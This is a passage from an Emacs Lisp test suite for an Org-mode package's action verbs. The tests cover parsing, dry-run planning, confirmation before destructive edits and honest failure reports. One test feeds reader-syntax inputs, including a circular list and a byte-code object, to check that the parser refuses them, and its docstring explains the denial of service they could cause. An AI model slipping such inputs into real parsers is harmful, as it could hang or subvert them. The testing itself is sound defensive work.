is refused HERE rather than discovered half way through an apply pass.
Declared with a symbol property, so a verb defined in init can say the
same of itself.

Mutation that must fail it: drop the rule."
  (should (org-agents--action-terminal-p 'org-agents-action/archive!))
  (let ((err (should-error (org-agents--parse-actions "archive! tag!(+x)")
                          :type 'user-error)))
    ;; Quote characters are left out of every pattern here on purpose:
    ;; `user-error' passes its format through `format-message', which
    ;; turns a grave accent and an apostrophe into curly quotes.
    (should (string-match-p "archive!" (error-message-string err)))
    (should (string-match-p "must be the last verb"
                            (error-message-string err))))
  (should-error (org-agents--parse-actions "archive! archive!")
                :type 'user-error)
  ;; The other way round is fine, and is the documented shape.
  (should (equal (org-agents--parse-actions "tag!(+x) archive!")
                 '((org-agents-action/tag! "+x")
                   (org-agents-action/archive!)))))

(ert-deftest org-agents-test-action-parse-rejects-reader-syntax ()
  "Reader syntax has no meaning here, and this test says what happens instead.
Three of these four are refused by SHAPE, because each holds a
parenthesis, a bracket or a quote that no bare argument may hold; and
the fourth -- `#$' -- is accepted as the two characters it is.  That is
the honest answer and it is a STRONGER statement than a refusal would
be: `#$' is exactly the syntax that, handed to `read-from-string' inside
a file being loaded, yields that file's own name.  Here it yields `#$',
because nothing read anything.

MEASURED, as the argument list of one verb, `read-from-string' answers
`(#$)' with the loading file's name; `(#s(hash-table test equal))' with
a live hash table; `(#1=(a . #1#))' with a CIRCULAR cons, which
`format' \"%s\" prints forever unless `print-circle' happens to be
bound -- a denial of service out of a property; and
`(#[257 \"...\" [1] 2])' with a byte-code object, a callable arriving as
data.  This test COMPLETING is part of what it asserts: the circular one
cannot be built, so no report line can loop on it.

Mutation that must fail it: lex with `read-from-string'."
  (should (equal (org-agents--parse-actions "set-property!(X, #$)")
                 '((org-agents-action/set-property! "X" "#$"))))
  (dolist (text '("set-property!(X, #s(hash-table test equal))"
                  "set-property!(X, #1=(a . #1#))"
                  "set-property!(X, #[257 \"\\300\\207\" [1] 2])"))
    (should-error (org-agents--parse-actions text) :type 'user-error)))

(ert-deftest org-agents-test-action-parse-anchors-at-the-index ()
  "Every token is matched at the index, not merely somewhere after it.
MEASURED: a regexp beginning `\\\\=' handed to `string-match' with a
non-zero START does not anchor at START, and the first prototype of this
lexer therefore reported an error at character 4 of a bare `archive!'.
`org-agents--action-at' compares `match-beginning' with the index
instead, and these are the inputs that tell the two apart.

Mutation that must fail it: replace `org-agents--action-at' with a
`\\\\='-prefixed regexp."
  (should (equal (org-agents--parse-actions "archive!")
                 '((org-agents-action/archive!))))
  ;; Three tokens in a row, each writing a different field -- three
  ;; `tag!'s would be refused before the second was lexed.
  (should (equal (org-agents--parse-actions "tag!(+a) priority!(A) effort!(0:30)")
                 '((org-agents-action/tag! "+a")
                   (org-agents-action/priority! "A")
                   (org-agents-action/effort! "0:30"))))
  ;; The helper itself, at an index in the middle of a string.
  (should (org-agents--action-at "tag!" "xxxtag!" 3))
  (should-not (org-agents--action-at "tag!" "xxxytag!" 3)))

(ert-deftest org-agents-test-action-parse-unreadable-text-names-the-place ()
  "Text that is no token at all is refused with a character position.
The one diagnostic that cannot name a verb, because it has not read one
yet -- so it names where it stopped and quotes what it found there."
  (let ((err (should-error (org-agents--parse-actions "tag!(+a) junk here")
                          :type 'user-error)))
    (should (string-match-p "unreadable at character 10"
                            (error-message-string err)))
    (should (string-match-p "junk here" (error-message-string err))))
  ;; An unclosed argument list names the verb instead.
  (let ((err (should-error (org-agents--parse-actions "tag!(+a")
                          :type 'user-error)))
    (should (string-match-p "tag!" (error-message-string err)))
    (should (string-match-p "argument list is not closed"
                            (error-message-string err)))))

(ert-deftest org-agents-test-action-vocabulary-is-complete ()
  "The shipped vocabulary is exactly the nine verbs this suite owns.
Derived by `mapatoms' over the namespace, in the same style as
`org-agents-test-every-defcustom-is-risky': a tenth verb added to the
package and not to `org-agents-test--action-verbs' fails here, which is
what keeps one from arriving without the destructive declaration and the
tripwire coverage the other nine have."
  (let (found)
    (mapatoms (lambda (symbol)
                (when (and (fboundp symbol)
                           (string-prefix-p "org-agents-action/"
                                            (symbol-name symbol)))
                  (push symbol found))))
    (should found)
    (should (equal (sort (mapcar #'symbol-name found) #'string<)
                   (sort (mapcar #'symbol-name
                                 (copy-sequence org-agents-test--action-verbs))
                         #'string<)))))

;;;; Actions: the vocabulary

;; Every test here plans at a real entry in a temporary file and, where it
;; applies anything, reads the result back out of the buffer that holds
;; it.  `org-agents-test--with-action-corpus' is the fixture, and a.org's
;; two entries -- `Fix widget' tagged `:api:' and `Fix gadget' tagged
;; `:api:stale:' -- are what the verbs are aimed at.

(defmacro org-agents-test--at-match (&rest body)
  "Run BODY at the `Fix widget' entry of the action fixture's a.org.
The verbs are functions of the entry at point, so this is what a test of
one looks like: point on the entry, and no agent involved at all."
  (declare (indent 0))
  `(with-current-buffer (find-file-noselect a)
     (org-with-wide-buffer
      (goto-char (point-min))
      (should (re-search-forward "^\\*+.*Fix widget" nil t))
      (org-back-to-heading t)
      ,@body)))

(ert-deftest org-agents-test-action-verbs-apply-each-edit ()
  "Each verb, applied, leaves its edit in the entry it was applied at.
One assertion per verb, read back through Org's own accessors at the
entry rather than by matching the buffer text, because what is claimed
is that the ENTRY changed and not that some characters appeared.

Mutation that must fail it: any verb body."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (org-agents-action/set-property! 'apply "REVIEWED" "2020-01-01")
      (should (equal "2020-01-01" (org-entry-get nil "REVIEWED")))
      (org-agents-action/delete-property! 'apply "NEXT_REVIEW")
      (should-not (org-entry-get nil "NEXT_REVIEW"))
      (org-agents-action/tag! 'apply "+reviewed -api")
      (should (equal '("reviewed") (org-get-tags nil t)))
      (org-agents-action/todo! 'apply "DONE")
      (should (equal "DONE" (org-get-todo-state)))
      (org-agents-action/priority! 'apply "A")
      (should (equal "A" (org-entry-get nil "PRIORITY")))
      (org-agents-action/scheduled! 'apply "2030-01-01")
      (should (string-match-p "2030-01-01" (org-entry-get nil "SCHEDULED")))
      (org-agents-action/deadline! 'apply "2030-02-02")
      (should (string-match-p "2030-02-02" (org-entry-get nil "DEADLINE")))
      (org-agents-action/effort! 'apply "0:30")
      (should (equal "0:30" (org-entry-get nil org-effort-property))))
    ;; `archive!' last, since it takes the subtree away.
    (org-agents-test--at-match
      (org-agents-action/archive! 'apply))
    (with-current-buffer (find-file-noselect a)
      (should-not (string-match-p "Fix widget" (buffer-string))))
    ;; The subtree is in the archive BUFFER, and the archive file is NOT
    ;; on disk: MEASURED, `org-archive-subtree' ends with `save-buffer'
    ;; because `org-archive-subtree-save-file-p' defaults to `from-org',
    ;; and a run whose summary says "nothing was saved" may not leave a
    ;; file behind that no `undo' can take back.
    (should-not (file-exists-p (concat a "_archive")))
    (let ((archive (get-file-buffer (concat a "_archive"))))
      (should archive)
      (should (buffer-modified-p archive))
      (should (string-match-p "Fix widget"
                              (with-current-buffer archive (buffer-string)))))))

(ert-deftest org-agents-test-action-verbs-plan-writes-nothing ()
  "Every verb's `plan' phase writes nothing and answers (OLD . NEW).
`buffer-chars-modified-tick' before and after, for all nine, and the
shape of what comes back checked as well: a cons of two strings-or-nil.
The shape matters as much as the silence -- a verb whose author wrote
only the applier would contribute no report line, and the dry run would
UNDERSTATE what applying is about to do.

Mutations that must fail it: a `plan' arm that writes; a `plan' arm that
answers the wrong shape."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (dolist (call '((org-agents-action/set-property! "REVIEWED" "today")
                      (org-agents-action/delete-property! "NEXT_REVIEW")
                      (org-agents-action/tag! "+reviewed -api")
                      (org-agents-action/todo! "DONE")
                      (org-agents-action/priority! "A")
                      (org-agents-action/scheduled! "+7d")
                      (org-agents-action/deadline! "today")
                      (org-agents-action/effort! "0:30")
                      (org-agents-action/archive!)))
        (let* ((tick (buffer-chars-modified-tick))
               (modified (buffer-modified-p))
               (plan (apply (car call) 'plan (cdr call))))
          (should (= tick (buffer-chars-modified-tick)))
          (should (eq modified (buffer-modified-p)))
          (should (consp plan))
          (should (or (null (car plan)) (stringp (car plan))))
          (should (or (null (cdr plan)) (stringp (cdr plan)))))))
    ;; And the file is untouched on disk as well.
    (should (equal "* TODO Fix widget :api:\n:PROPERTIES:\n:NEXT_REVIEW: [2020-01-01 Wed]\n:END:\n* TODO Fix gadget :api:stale:\n:PROPERTIES:\n:NEXT_REVIEW: [2020-01-02 Thu]\n:END:\n"
                   (org-agents-test--file-text a)))))

(ert-deftest org-agents-test-action-verbs-refuse-a-third-phase ()
  "A phase that is neither `plan' nor `apply' is an `error', not a `user-error'.
The phase is this package's own argument, so a third value can only be a
bug here -- and a bug should reach the debugger rather than be reported
as a diagnosis of somebody's corpus."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (dolist (call '((org-agents-action/set-property! "R" "v")
                      (org-agents-action/delete-property! "R")
                      (org-agents-action/tag! "+r")
                      (org-agents-action/todo! "DONE")
                      (org-agents-action/priority! "A")
                      (org-agents-action/scheduled! "+7d")
                      (org-agents-action/deadline! "+7d")
                      (org-agents-action/effort! "0:30")
                      (org-agents-action/archive!)))
        (let ((err (should-error (apply (car call) 'simulate (cdr call)))))
          (should-not (eq 'user-error (car err)))
          (should (string-match-p "bad action phase"
                                  (error-message-string err))))))))

(ert-deftest org-agents-test-action-tag-requires-a-sign ()
  "`tag!' takes signed terms, adds and removes, and keeps the rest.
The divergence from org-edna, tested as a divergence: an unsigned term
is refused rather than read as \"add\", because edna's `tag!' REPLACES an
entry's tags and a one-word form that quietly did that over a match set
would be a mass deletion.

Mutation that must fail it: port edna's replace-all semantics."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (let ((err (should-error (org-agents-action/tag! 'plan "reviewed")
                              :type 'user-error)))
        (should (string-match-p "tag!" (error-message-string err)))
        (should (string-match-p "\\+TAG" (error-message-string err))))
      ;; The plan says what it will do to the tags that are there.
      (should (equal '(":api:" . ":api:reviewed:")
                     (org-agents-action/tag! 'plan "+reviewed")))
      (org-agents-action/tag! 'apply "+reviewed")
      (should (equal '("api" "reviewed") (org-get-tags nil t)))
      ;; A removal takes only what it names.
      (org-agents-action/tag! 'apply "-api")
      (should (equal '("reviewed") (org-get-tags nil t)))
      ;; Left to right, and adding twice adds once.
      (org-agents-action/tag! 'apply "+a +a -reviewed +b")
      (should (equal '("a" "b") (org-get-tags nil t)))
      ;; Removing what is not there is not an error.
      (org-agents-action/tag! 'apply "-nothere")
      (should (equal '("a" "b") (org-get-tags nil t))))))

(ert-deftest org-agents-test-action-destructive-verbs-are-declared ()
  "Exactly `archive!' and `delete-property!' are destructive.
Declared by a symbol property rather than by a list here, so a verb
defined in init can declare itself with the same `put'.  Both halves are
asserted: the two that carry it, and the seven that must not.

Mutation that must fail it: add or drop a `put'."
  (should (get 'org-agents-action/archive! 'org-agents-action-destructive))
  (should (get 'org-agents-action/delete-property!
               'org-agents-action-destructive))
  (dolist (verb org-agents-test--action-verbs)
    (should (eq (and (memq verb '(org-agents-action/archive!
                                  org-agents-action/delete-property!))
                     t)
                (and (get verb 'org-agents-action-destructive) t)))))

(ert-deftest org-agents-test-action-destructive-verb-answered-no-changes-nothing ()
  "A destructive edit refused leaves the entry and the file exactly as they were.
Asked, and then not done: the confirmation is asked BEFORE the edit, so a
`no' costs nothing.  The buffer is compared as well as the file, because
an edit nobody saved is still an edit.

Mutation that must fail it: apply before asking."
  (org-agents-test--at-agent "archive!"
    (let ((before-disk (org-agents-test--file-text a))
          (before-live (with-current-buffer (find-file-noselect a)
                         (buffer-substring-no-properties (point-min)
                                                         (point-max)))))
      (org-agents-test--answering-no (org-agents-apply-actions))
      (should (equal before-disk (org-agents-test--file-text a)))
      (should (equal before-live
                     (with-current-buffer (find-file-noselect a)
                       (buffer-substring-no-properties (point-min)
                                                       (point-max)))))
      (should-not (file-exists-p (concat a "_archive"))))))

(ert-deftest org-agents-test-action-destructive-verb-asks-every-time ()
  "A destructive verb asks at every entry, and again on the next run.
Two matches and one destructive verb, so a run asks twice -- once for
the whole plan and once per entry, which is three -- and a second run
asks three more.  There is no remembered approval and nothing to set.

Mutation that must fail it: memoise the answer, add a \"remember\"
variable, or hoist the ask out of the loop."
  ;; `OWNER' and not `NEXT_REVIEW': deleting the property the query
  ;; matches on would make the SECOND run match nothing, and the test
  ;; would then pass for the wrong reason -- no asks because no entries.
  (org-agents-test--at-agent "delete-property!(OWNER)"
    ;; And the property has to BE there: a row that would change nothing
    ;; is neither counted nor asked about, so deleting a property no
    ;; entry carries would ask once and prove nothing.
    (org-agents-test--put-property a "Fix widget" "OWNER" "ada")
    (org-agents-test--put-property a "Fix gadget" "OWNER" "grace")
    (let ((asked 0))
      (let ((noninteractive nil)
            (inhibit-interaction nil))
        (cl-letf (((symbol-function 'y-or-n-p)
                   (lambda (&rest _) (setq asked (1+ asked)) t))
                  ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
          (org-agents-apply-actions)
          ;; One for the plan, one for each of the two entries.
          (should (= 3 asked))
          ;; Put it back, for the same reason: the second run has to have
          ;; something to do.  What is under test is that saying yes once
          ;; is not remembered.
          (org-agents-test--put-property a "Fix widget" "OWNER" "ada")
          (org-agents-test--put-property a "Fix gadget" "OWNER" "grace")
          (goto-char (point-min))
          (org-agents-apply-actions)
          (should (= 6 asked)))))))

(ert-deftest org-agents-test-action-inhibit-interaction-refuses ()
  "`inhibit-interaction' is honoured as the refusal it is.
A caller's own declaration that it must not be asked -- a `--script', a
daemon, an async capture -- and Emacs 28 added it for exactly this.
Asserted with `noninteractive' bound OFF, so what is under test is the
second half of the `or' and not the first.

Mutation that must fail it: drop `inhibit-interaction' from the `or'."
  (org-agents-test--at-agent "archive!"
    (let ((before (org-agents-test--file-text a))
          (noninteractive nil)
          (inhibit-interaction t))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (&rest _) (error "org-agents-test: must not prompt"))))
        (let ((err (should-error (org-agents-apply-actions)
                                 :type 'user-error)))
          (should (string-match-p "refused, because there is no one to ask"
                                  (error-message-string err)))))
      (should (equal before (org-agents-test--file-text a))))))

(ert-deftest org-agents-test-action-confirmed-destructive-verb-applies ()
  "With somebody there to say yes, the destructive edit happens.
The other half of the refusal: it is a refusal for want of an answer and
not a ban.

Mutation that must fail it: make the refusal unconditional."
  (org-agents-test--at-agent "archive!"
    (org-agents-test--answering-yes (org-agents-apply-actions))
    (with-current-buffer (find-file-noselect a)
      (should-not (string-match-p "Fix widget" (buffer-string)))
      (should-not (string-match-p "Fix gadget" (buffer-string))))
    ;; Archived into a BUFFER, and no file on disk -- see
    ;; `org-agents-test-action-archive-saves-no-file'.
    (should-not (file-exists-p (concat a "_archive")))
    (should (get-file-buffer (concat a "_archive")))))

(ert-deftest org-agents-test-action-value-keywords ()
  "Three value keywords, expanded by the verb, and shadowed by quoting.
`today' and `now' are INACTIVE stamps, because a value written into a
drawer must not put the entry on the agenda.  `empty' is the empty
string.  A quoted argument is never a keyword, which is the escape hatch
for the one cost of having keywords at all.

The table is asserted to hold exactly three entries: it is a vocabulary,
and a fourth arriving silently would shadow a literal somebody was
storing.

Mutations that must fail it: evaluate the argument; widen the table."
  (should (= 3 (length org-agents--action-values)))
  (should (equal (format-time-string (org-time-stamp-format nil t))
                 (org-agents--action-value "today")))
  (should (equal (format-time-string (org-time-stamp-format t t))
                 (org-agents--action-value "now")))
  (should (equal "" (org-agents--action-value "empty")))
  ;; Inactive, and that is the whole point of the choice.
  (should (string-prefix-p "[" (org-agents--action-value "today")))
  ;; A bare word that is not a keyword is itself.
  (should (equal "REVIEWED" (org-agents--action-value "REVIEWED")))
  (should (equal "yesterday" (org-agents--action-value "yesterday")))
  ;; And the parser's own quoting mark makes a keyword literal.
  (should (equal '((org-agents-action/set-property! "R" "today"))
                 (org-agents--parse-actions "set-property!(R, \"today\")")))
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (pcase-let ((`((,verb . ,args))
                   (org-agents--parse-actions
                    "set-property!(R, \"today\")")))
        (apply verb 'apply args))
      (should (equal "today" (org-entry-get nil "R")))
      (pcase-let ((`((,verb . ,args))
                   (org-agents--parse-actions "set-property!(S, today)")))
        (apply verb 'apply args))
      (should (equal (format-time-string (org-time-stamp-format nil t))
                     (org-entry-get nil "S"))))))

(ert-deftest org-agents-test-action-todo-refuses-an-unknown-state ()
  "`todo!' refuses a state the file does not admit, in the PLAN phase.
Named with the state and the file, and raised where nothing has been
written yet, so a typo costs a refusal rather than half a corpus.  The
keywords are read in the MATCH'S buffer, because they are buffer-local:
a corpus may spell different ones file by file.

Mutations that must fail it: validate in the `apply' phase instead;
validate against a global keyword list."
  (org-agents-test--with-action-corpus nil
    ;; A file with keywords of its own, to show the check is local.
    (let ((c (expand-file-name "c.org" dir)))
      (with-temp-file c
        (insert "#+TODO: OPEN | SHIPPED\n* OPEN Local keywords\n"))
      (org-agents-test--at-match
        (let ((err (should-error (org-agents-action/todo! 'plan "BOGUS")
                                :type 'user-error)))
          (should (string-match-p "BOGUS" (error-message-string err)))
          (should (string-match-p "a\\.org" (error-message-string err))))
        ;; `SHIPPED' is no keyword HERE ...
        (should-error (org-agents-action/todo! 'plan "SHIPPED")
                      :type 'user-error))
      ;; ... and is one there.
      (with-current-buffer (find-file-noselect c)
        (goto-char (point-min))
        ;; Past the `#+TODO:' line: point-min is before the first
        ;; headline in a file with a keyword at the top.
        (should (re-search-forward "^\\* " nil t))
        (org-back-to-heading t)
        (should (equal '("OPEN" . "SHIPPED")
                       (org-agents-action/todo! 'plan "SHIPPED")))
        (should-error (org-agents-action/todo! 'plan "DONE")
                      :type 'user-error)))))

(ert-deftest org-agents-test-action-date-shape-is-checked ()
  "A planning verb refuses anything that is not a date it can read.
MEASURED, and this is the hazard the check exists for:
`(org-read-date nil nil \"junk\")' answers with TODAY'S DATE, so
`(org-schedule nil \"nextweek\")' schedules today and says nothing at
all.  Ported naively, one misspelled action would mass-schedule a corpus
to today.

The plan also SHOWS the computed stamp, so an offset is a date the user
can read before agreeing to it.

Mutation that must fail it: drop `org-agents--action-date-re'."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (dolist (bad '("nextweek" "junk" "soon" "2026" "+7" "7d" "tomorrow"))
        (let ((err (should-error (org-agents-action/scheduled! 'plan bad)
                                :type 'user-error)))
          (should (string-match-p "scheduled!" (error-message-string err))))
        (should-error (org-agents-action/deadline! 'plan bad)
                      :type 'user-error))
      ;; And the shapes that are accepted plan a stamp a reader can check.
      (should (equal (cons nil (format-time-string
                                (org-time-stamp-format nil)
                                (time-add nil (days-to-time 7))))
                     (org-agents-action/scheduled! 'plan "+7d")))
      (should (equal (cons nil (format-time-string
                                (org-time-stamp-format nil)))
                     (org-agents-action/scheduled! 'plan "today")))
      (should (string-match-p "\\`<2030-01-01"
                              (cdr (org-agents-action/deadline!
                                    'plan "2030-01-01"))))
      (should (string-match-p "\\`<2030-01-01 [^ ]+ 14:00>\\'"
                              (cdr (org-agents-action/deadline!
                                    'plan "2030-01-01 14:00")))))))

(ert-deftest org-agents-test-action-set-property-refuses-a-special-property ()
  "`set-property!' will not write a special property, and names the verb that will.
MEASURED: `org-entry-put' special-cases `TODO', `PRIORITY', `SCHEDULED'
and `DEADLINE', and for a `SCHEDULED'/`DEADLINE' value that is empty or
`earlier'/`later' it reaches `call-interactively' on `org-schedule' -- a
prompt from inside a verb, in the middle of a run over a corpus.

Mutation that must fail it: route those names through `org-entry-put'."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (let ((err (should-error
                  (org-agents-action/set-property! 'plan "TODO" "DONE")
                  :type 'user-error)))
        (should (string-match-p "TODO" (error-message-string err)))
        (should (string-match-p "todo!" (error-message-string err))))
      (let ((err (should-error
                  (org-agents-action/set-property! 'plan "SCHEDULED" "")
                  :type 'user-error)))
        (should (string-match-p "scheduled!" (error-message-string err))))
      (dolist (name '("TODO" "PRIORITY" "SCHEDULED" "DEADLINE" "TAGS"
                      "ITEM" "CLOCKSUM" "FILE" "ALLTAGS"))
        (should-error (org-agents-action/set-property! 'apply name "x")
                      :type 'user-error))
      ;; Spelled in lower case it is the same name, because Org matches a
      ;; property key case-insensitively.
      (should-error (org-agents-action/set-property! 'plan "todo" "DONE")
                    :type 'user-error))))

(ert-deftest org-agents-test-action-archive-plans-its-destination ()
  "`archive!' plans where the subtree is going, and creates nothing doing it.
The location comes from `org-archive--compute-location', which is the
expression `org-archive-subtree' itself uses, so the dry run names the
file the subtree will actually land in.

Mutation that must fail it: compute the destination by archiving."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (let ((plan (org-agents-action/archive! 'plan)))
        (should (equal "<subtree>" (car plan)))
        (should (string-suffix-p "a.org_archive" (cdr plan)))))
    (should-not (file-exists-p (concat a "_archive")))
    ;; An `:ARCHIVE:' property is honoured, and still nothing is written.
    (org-agents-test--at-match
      (org-entry-put nil "ARCHIVE" (concat dir "/elsewhere.org::"))
      (should (string-suffix-p "elsewhere.org"
                               (cdr (org-agents-action/archive! 'plan)))))
    (should-not (file-exists-p (expand-file-name "elsewhere.org" dir)))))

(ert-deftest org-agents-test-action-priority-is-range-checked ()
  "`priority!' takes one upper-case letter inside the configured range.
`aref' of a checked string, never `string-to-char' of something `read',
and the bound is Org's own."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (dolist (bad '("a" "AA" "1" "" "Z"))
        (should-error (org-agents-action/priority! 'plan bad)
                      :type 'user-error))
      (should (equal "A" (cdr (org-agents-action/priority! 'plan "A"))))
      ;; A wider range admits more, which is what makes this a range check
      ;; rather than a spelling of A to C.
      (let ((org-priority-lowest ?Z))
        (should (equal "Z" (cdr (org-agents-action/priority! 'plan "Z"))))))))

(ert-deftest org-agents-test-action-extension-is-a-defun ()
  "A verb defined outside the package resolves, plans and applies.
No registration, no list to add to, no second name: the namespace IS the
contract.  And a verb that honours no `plan' phase is DIAGNOSED rather
than silently contributing no line to the report -- which is the one
failure a dry run may not have.

Mutation that must fail it: a registry- or list-based resolver."
  (unwind-protect
      (progn
        (defun org-agents-action/shout! (phase name)
          "A verb defined for a test, exactly as one would be in init."
          (pcase phase
            ('plan (cons (org-entry-get nil name)
                         (upcase (or (org-entry-get nil name) ""))))
            ('apply (org-entry-put nil name
                                   (upcase (or (org-entry-get nil name) ""))))))
        (defun org-agents-action/halfway! (phase name)
          "A verb whose author wrote only the applier."
          (ignore name)
          (pcase phase
            ('apply (org-entry-put nil name "written"))))
        (should (equal '((org-agents-action/shout! "OWNER"))
                       (org-agents--parse-actions "shout!(OWNER)")))
        (org-agents-test--at-agent "shout!(OWNER)"
          (with-current-buffer (find-file-noselect a)
            (org-with-wide-buffer
             (goto-char (point-min))
             (while (re-search-forward "^\\*+ " nil t)
               (org-back-to-heading t)
               (org-entry-put nil "OWNER" "johnw")
               (end-of-line))))
          (org-agents-test--answering-yes (org-agents-apply-actions))
          (should (equal "JOHNW"
                         (org-agents-test--action-property a "Fix widget"
                                                           "OWNER"))))
        ;; The half-written one is named, and nothing is applied.
        (org-agents-test--at-agent "halfway!(OWNER)"
          (let ((err (should-error
                      (org-agents-test--answering-yes (org-agents-apply-actions))
                      :type 'user-error)))
            (should (string-match-p "halfway!" (error-message-string err)))
            (should (string-match-p "planned nothing"
                                    (error-message-string err))))
          (should-not (org-agents-test--action-property a "Fix widget"
                                                        "OWNER"))))
    (fmakunbound 'org-agents-action/shout!)
    (fmakunbound 'org-agents-action/halfway!)))

;;;; Actions: the command and its dry run

(defun org-agents-test--action-report-lines ()
  "The lines of the action report buffer, and nothing else."
  (with-current-buffer org-agents--action-buffer
    (split-string (buffer-substring-no-properties (point-min) (point-max))
                  "\n" t)))

(defun org-agents-test--action-edit-lines ()
  "The report lines that are intended edits -- `FILE:LINE: ...' and no other."
  (cl-remove-if-not (lambda (line) (string-match-p "\\`/.*:[0-9]+: " line))
                    (org-agents-test--action-report-lines)))

(defun org-agents-test--action-corpus-snapshot (&rest files)
  "The text of FILES, buffer and disk both, as one comparable list.
Buffer AND disk, because an action's edits land in a buffer and are never
saved: a snapshot off disk alone would call an unsaved mass edit no
change at all.  Learnt the hard way -- see
`org-agents-test-action-save-differs-only-by-the-render'."
  (mapcar (lambda (file)
            (list file
                  (org-agents-test--file-text file)
                  (with-current-buffer (find-file-noselect file)
                    (buffer-substring-no-properties (point-min) (point-max)))))
          files))

(ert-deftest org-agents-test-action-dry-run-writes-nothing ()
  "The dry run reports every intended edit and writes not one byte.
Answered `no', so nothing is applied: every corpus file is identical in
its buffer and on disk, no buffer is modified, and the report holds one
line per intended edit with its `old -> new'.

Mutation that must fail it: plan and apply in one pass."
  (org-agents-test--at-agent "set-property!(REVIEWED, today) tag!(+reviewed)"
    (let ((before (org-agents-test--action-corpus-snapshot a b)))
      (org-agents-test--answering-no (org-agents-apply-actions))
      (should (equal before (org-agents-test--action-corpus-snapshot a b)))
      (should-not (buffer-modified-p (find-file-noselect a)))
      (should-not (buffer-modified-p (find-file-noselect b)))
      ;; Two verbs at each of the two matches.
      (let ((lines (org-agents-test--action-edit-lines)))
        (should (= 4 (length lines)))
        (should (cl-every (lambda (line) (string-match-p " -> " line)) lines))
        (should (= 2 (cl-count-if
                      (lambda (line)
                        (string-match-p "set-property!(REVIEWED, today)" line))
                      lines)))
        (should (= 2 (cl-count-if
                      (lambda (line) (string-match-p "tag!(\\+reviewed)" line))
                      lines))))
      ;; The header, read AT THE MOMENT the question is asked: the whole
      ;; report is there and it says nothing has been written.  Read
      ;; afterwards it would say what the run went on to do instead,
      ;; which is a different claim.
      (let (header)
        (let ((noninteractive nil)
              (inhibit-interaction nil))
          (cl-letf (((symbol-function 'y-or-n-p)
                     (lambda (&rest _)
                       (setq header
                             (car (org-agents-test--action-report-lines)))
                       nil))
                    ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
            (org-agents-apply-actions)))
        (should (string-match-p "4 edits at 2 entries in 1 file" header))
        (should (string-match-p "Nothing written yet" header)))
      ;; And afterwards it says so, which is the other half of honest.
      (should (string-match-p "NOTHING WAS APPLIED"
                              (car (org-agents-test--action-report-lines))))
      (should (equal before (org-agents-test--action-corpus-snapshot a b))))))

(ert-deftest org-agents-test-action-applies-exactly-what-was-listed ()
  "Applying does what the report said, at those entries, and nothing else.
Both halves: every reported edit is in the buffer afterwards, and no
entry outside the plan changed at all -- the second file in the corpus is
compared byte for byte, buffer and disk.

Mutations that must fail it: apply a verb the report omitted; apply at an
entry that was not in the plan."
  (org-agents-test--at-agent "set-property!(REVIEWED, today) tag!(+reviewed)"
    (let ((untouched (org-agents-test--action-corpus-snapshot b)))
      (org-agents-test--answering-yes (org-agents-apply-actions))
      (let ((stamp (format-time-string (org-time-stamp-format nil t))))
        (dolist (heading '("Fix widget" "Fix gadget"))
          (should (equal stamp (org-agents-test--action-property
                                a heading "REVIEWED")))
          (should (member "reviewed"
                          (org-agents-test--action-tags a heading)))
          ;; And the tags that were there are still there.
          (should (member "api" (org-agents-test--action-tags a heading)))))
      ;; `Fix gadget' keeps the tag only it had.
      (should (member "stale" (org-agents-test--action-tags a "Fix gadget")))
      (should-not (member "stale" (org-agents-test--action-tags a "Fix widget")))
      ;; The file nothing matched in is untouched.
      (should (equal untouched (org-agents-test--action-corpus-snapshot b)))
      ;; Every line says it was applied.
      (should (cl-every (lambda (line) (string-match-p "  applied\\'" line))
                        (org-agents-test--action-edit-lines))))))

(ert-deftest org-agents-test-action-report-is-navigable ()
  "The report is a `compilation-mode' buffer whose lines are locations.
`FILE:LINE:' first, so `RET', `next-error' and `M-g n' walk the INTENDED
edits before anything has been written -- which is worth more than any
prose about a dry run, and is the same measured precedent
`org-agents--attr-report' rests on.

Mutation that must fail it: drop the `FILE:LINE:' prefix."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (org-agents-test--answering-no (org-agents-apply-actions))
    (with-current-buffer org-agents--action-buffer
      (should (derived-mode-p 'compilation-mode))
      (goto-char (point-min))
      (compilation-next-error 1)
      (let ((location (compilation-next-error 0)))
        (should location))
      ;; The first location is the first intended edit, in the file the
      ;; matches live in.
      (should (string-match-p (regexp-quote a)
                              (car (org-agents-test--action-edit-lines)))))))

(ert-deftest org-agents-test-action-failing-verb-leaves-an-honest-report ()
  "A verb that fails part way through says exactly what was and was not done.
The lines before it say `applied', its own says `FAILED', the ones after
it say `not attempted' -- and the buffer state matches that claim
exactly.  There is no rollback: `atomic-change-group' cannot span
buffers, and a corpus-wide undo does not exist.  The honest substitute is
this report, and this test is what says it is honest.

Mutations that must fail it: continue past the failure; report a count
without the per-line outcome."
  (unwind-protect
      (progn
        (defun org-agents-action/flaky! (phase name)
          "Apply once, then fail: a verb that breaks part way through a run."
          (pcase phase
            ('plan (cons (org-entry-get nil name) "done"))
            ('apply
             (if (get 'org-agents-action/flaky! 'fired)
                 (error "org-agents-test: the second one fails")
               (put 'org-agents-action/flaky! 'fired t)
               (org-entry-put nil name "done")))))
        (org-agents-test--at-agent "flaky!(STATE)"
          (org-agents-test--answering-yes (org-agents-apply-actions))
          (let ((lines (org-agents-test--action-edit-lines)))
            (should (= 2 (length lines)))
            (should (string-match-p "  applied\\'" (nth 0 lines)))
            (should (string-match-p "FAILED: .*the second one fails"
                                    (nth 1 lines))))
          ;; And the buffer says the same thing: one entry written, one not.
          (should (equal "done" (org-agents-test--action-property
                                 a "Fix widget" "STATE")))
          (should-not (org-agents-test--action-property
                       a "Fix gadget" "STATE"))))
    (put 'org-agents-action/flaky! 'fired nil)
    (fmakunbound 'org-agents-action/flaky!)))

(ert-deftest org-agents-test-action-later-rows-are-not-attempted ()
  "Everything after a failure is marked, not silently skipped.
Three entries and two verbs, failing at the third row: the report has to
account for all six lines, because a reader deciding what to fix needs to
